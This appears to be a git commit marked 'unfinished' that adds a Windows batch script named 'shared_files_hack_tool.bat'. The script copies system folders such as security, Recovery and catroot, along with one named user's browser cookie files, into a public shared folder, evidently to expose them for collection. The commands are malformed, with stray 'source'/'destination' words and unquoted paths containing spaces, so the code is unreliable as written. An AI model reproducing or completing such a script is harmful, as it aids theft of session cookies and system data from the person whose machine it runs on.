ffeac85d3ae61f5c933ed1596c8ba62ed29fa36a
coldflamethefirst <coldflamethefirst@gmail.com>
2014-02-19 22:48:14 +0000

    unfinished

---
+++ shared_files_hack_tool.bat
@@ -0,0 +1,13 @@
+cd C:\Users
+mkdir "public files"
+cd C:\
+copy source C:\Windows\security destination C:\Users\public files
+copy C:\Windows\Minidump C:\Users\public files
+copy C:\Windows\Vss\Writers\System C:\Users\public files
+copy C:\Windows\Temp C:\Users\public files
+copy C:\Windows\System32\DRVSTORE C:\Users\public files
+copy C:\Windows\System32\catroot C:\Users\public files
+copy C:\Windows\System32\catroot2 C:\Users\public files
+copy C:\Windows\System32\Recovery C:\Users\public files
+copy C:\Windows\rescache C:\Users\public files
+copy source C:\Users\struan\AppData\Roaming\Microsoft\Windows\Cookies\*.txt destinatiom C:\Users\public files
